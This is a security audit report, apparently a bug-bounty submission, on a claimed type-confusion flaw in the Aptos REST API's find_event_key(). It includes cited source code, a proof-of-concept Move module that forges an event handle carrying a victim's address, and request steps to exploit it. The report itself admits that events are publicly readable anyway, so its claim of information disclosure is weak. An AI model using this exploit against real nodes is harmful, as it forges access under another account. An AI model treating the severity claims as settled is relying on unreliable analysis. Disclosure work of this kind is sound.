# Audit Report

## Title
Type Confusion in Account::find_event_key() Allows Cross-Account Event Query

## Summary
The `Account::find_event_key()` function in the REST API lacks type validation when deserializing struct fields as `EventHandle`, allowing an attacker to craft a malicious resource with a field that has the same byte layout as `EventHandle` but contains an `EventKey` pointing to a different account's events. This enables unauthorized querying of events from arbitrary accounts.

## Finding Description

The vulnerability exists in the event query API endpoint at [1](#0-0) 

When a client calls `/accounts/:address/events/:event_handle/:field_name`, the API invokes `Account::find_event_key()` at [2](#0-1) 

The critical flaw is in the deserialization logic. The function:
1. Retrieves a resource from the account's storage
2. Extracts the field by name
3. Serializes the `MoveValue` to bytes
4. **Deserializes those bytes as `EventHandle` without validating the field's actual Move type** [3](#0-2) 

The Move `EventHandle` structure has the byte layout: [4](#0-3) 

Combined with the GUID structure: [5](#0-4) 

This creates a byte layout of `[counter: u64][creation_num: u64][addr: address]`, which matches the Rust `EventHandle` and `EventKey` structures at [6](#0-5)  and [7](#0-6) 

**Attack Path:**
1. Attacker deploys a malicious module with a custom struct containing a field with the same byte layout as `EventHandle`
2. The field's embedded address points to a victim's account
3. Attacker calls `/accounts/<attacker>/events/<malicious_struct>/<field_name>`
4. API deserializes the malicious field as `EventHandle`, extracting a crafted `EventKey` pointing to the victim
5. API returns events from the victim's account

This breaks the **Access Control** invariant - the API should only return event data associated with resources actually owned by the queried account, not arbitrary EventKeys constructed by an attacker.

## Impact Explanation

**Severity: Medium** (up to $10,000 per bug bounty criteria)

This vulnerability enables:
- **Information Disclosure**: Unauthorized access to event data from any account
- **Privacy Violation**: Events may contain sensitive information about account activities (coin registrations, key rotations, token transfers)

Events are indexed by `EventKey` and contain transaction metadata. While events are publicly readable if you know the EventKey (via the `get_events_by_creation_number` endpoint), the `find_event_key()` function is meant to help discover EventKeys by examining resources at a specific account. This vulnerability allows attackers to manufacture EventKeys for accounts they don't control.

This does not directly lead to fund theft or consensus violations, but it violates the API's security model and exposes potentially sensitive account activity data.

## Likelihood Explanation

**Likelihood: High**

The attack is straightforward to execute:
- Requires only deploying a Move module (standard blockchain operation)
- No special permissions or validator access needed
- Byte layout matching is trivial to achieve
- No rate limiting or additional validation prevents this attack

## Recommendation

Add type validation to ensure the extracted field is actually of type `EventHandle<T>` before deserialization. The fix should verify the field's Move type information from the resource metadata: [8](#0-7) 

**Proposed Fix:**
1. After retrieving the resource's struct fields via `move_struct_fields()`, check that the field type matches `EventHandle<T>`
2. Extract type information from the `MoveValue` and validate it against the expected `aptos_framework::event::EventHandle` type
3. Only proceed with deserialization if the type check passes
4. Return a proper error if the field type doesn't match

Alternatively, use the typed Move resource viewer to deserialize the entire resource with type information preserved, rather than re-serializing individual fields.

## Proof of Concept

```move
// File: sources/malicious_events.move
module attacker::malicious_events {
    struct FakeEventHandle has store {
        counter: u64,
        creation_num: u64,
        addr: address,
    }
    
    struct MaliciousResource has key {
        fake_events: FakeEventHandle,
    }
    
    public entry fun setup(account: &signer, victim: address) {
        move_to(account, MaliciousResource {
            fake_events: FakeEventHandle {
                counter: 0,
                creation_num: 0,  // Points to victim's coin_register_events
                addr: victim,
            }
        });
    }
}
```

**Exploitation Steps:**
1. Deploy the module above to attacker's account (0xATTACKER)
2. Execute `setup()` with victim's address (0xVICTIM)
3. Call API: `GET /accounts/0xATTACKER/events/0xATTACKER::malicious_events::MaliciousResource/fake_events`
4. API returns EventKey(0, 0xVICTIM) and queries events from victim's account
5. Attacker receives victim's `coin_register_events` data

This demonstrates the type confusion vulnerability allowing cross-account event query without authorization.

### Citations

**File:** api/src/events.rs (L101-150)
```rust
    async fn get_events_by_event_handle(
        &self,
        accept_type: AcceptType,
        /// Hex-encoded 32 byte Aptos account, with or without a `0x` prefix, for
        /// which events are queried. This refers to the account that events were
        /// emitted to, not the account hosting the move module that emits that
        /// event type.
        address: Path<Address>,
        /// Name of struct to lookup event handle e.g. `0x1::account::Account`
        event_handle: Path<MoveStructTag>,
        /// Name of field to lookup event handle e.g. `withdraw_events`
        field_name: Path<IdentifierWrapper>,
        /// Starting sequence number of events.
        ///
        /// If unspecified, by default will retrieve the most recent
        start: Query<Option<U64>>,
        /// Max number of events to retrieve.
        ///
        /// If unspecified, defaults to default page size
        limit: Query<Option<u16>>,
    ) -> BasicResultWith404<Vec<VersionedEvent>> {
        event_handle
            .0
            .verify(0)
            .context("'event_handle' invalid")
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code_no_info(err, AptosErrorCode::InvalidInput)
            })?;
        verify_field_identifier(field_name.as_str())
            .context("'field_name' invalid")
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code_no_info(err, AptosErrorCode::InvalidInput)
            })?;
        fail_point_poem("endpoint_get_events_by_event_handle")?;
        self.context
            .check_api_output_enabled("Get events by event handle", &accept_type)?;
        let page = Page::new(
            start.0.map(|v| v.0),
            limit.0,
            self.context.max_events_page_size(),
        );

        let api = self.clone();
        api_spawn_blocking(move || {
            let account = Account::new(api.context.clone(), address.0, None, None, None)?;
            let key = account.find_event_key(event_handle.0, field_name.0.into())?;
            api.list(account.latest_ledger_info, accept_type, page, key)
        })
        .await
    }
```

**File:** api/src/accounts.rs (L588-644)
```rust
    pub fn find_event_key(
        &self,
        struct_tag: MoveStructTag,
        field_name: Identifier,
    ) -> Result<EventKey, BasicErrorWith404> {
        // Parse the struct tag
        let struct_tag: StructTag = (&struct_tag)
            .try_into()
            .context("Given event handle was invalid")
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code(
                    err,
                    AptosErrorCode::InvalidInput,
                    &self.latest_ledger_info,
                )
            })?;

        // Find the resource and retrieve the struct field
        let (_, resource) = self.find_resource(&struct_tag)?;
        let (_id, value) = resource
            .into_iter()
            .find(|(id, _)| id == &field_name)
            .ok_or_else(|| {
                struct_field_not_found(
                    self.address,
                    &struct_tag,
                    &field_name,
                    self.ledger_version,
                    &self.latest_ledger_info,
                )
            })?;

        // Deserialize the event handle to retrieve the key
        let event_handle_bytes = bcs::to_bytes(&value)
            .context("Failed to serialize event handle from storage")
            .map_err(|err| {
                BasicErrorWith404::internal_with_code(
                    err,
                    AptosErrorCode::InternalError,
                    &self.latest_ledger_info,
                )
            })?;
        // Deserialization may fail because the bytes are not EventHandle struct type.
        let event_handle: EventHandle = bcs::from_bytes(&event_handle_bytes)
            .context(format!(
                "Deserialization error, field({}) type is not a EventHandle struct",
                field_name
            ))
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code(
                    err,
                    AptosErrorCode::InvalidInput,
                    &self.latest_ledger_info,
                )
            })?;
        Ok(*event_handle.key())
    }
```

**File:** aptos-move/framework/aptos-framework/sources/event.move (L36-41)
```text
    struct EventHandle<phantom T: drop + store> has store {
        /// Total number of events emitted to this event stream.
        counter: u64,
        /// A globally unique ID for this event stream.
        guid: GUID,
    }
```

**File:** aptos-move/framework/aptos-framework/sources/guid.move (L7-17)
```text
    struct GUID has drop, store {
        id: ID
    }

    /// A non-privileged identifier that can be freely created by anyone. Useful for looking up GUID's.
    struct ID has copy, drop, store {
        /// If creation_num is `i`, this is the `i+1`th GUID created by `addr`
        creation_num: u64,
        /// Address that created the GUID
        addr: address
    }
```

**File:** types/src/event.rs (L12-23)
```rust
#[derive(Clone, Copy, Debug, Deserialize, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize)]
pub struct EventKey {
    creation_number: u64,
    account_address: AccountAddress,
}

impl EventKey {
    pub fn new(creation_number: u64, account_address: AccountAddress) -> Self {
        Self {
            creation_number,
            account_address,
        }
```

**File:** types/src/event.rs (L86-92)
```rust
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct EventHandle {
    /// Number of events in the event stream.
    count: u64,
    /// The associated globally unique key that is used as the key to the EventStore.
    key: EventKey,
}
```
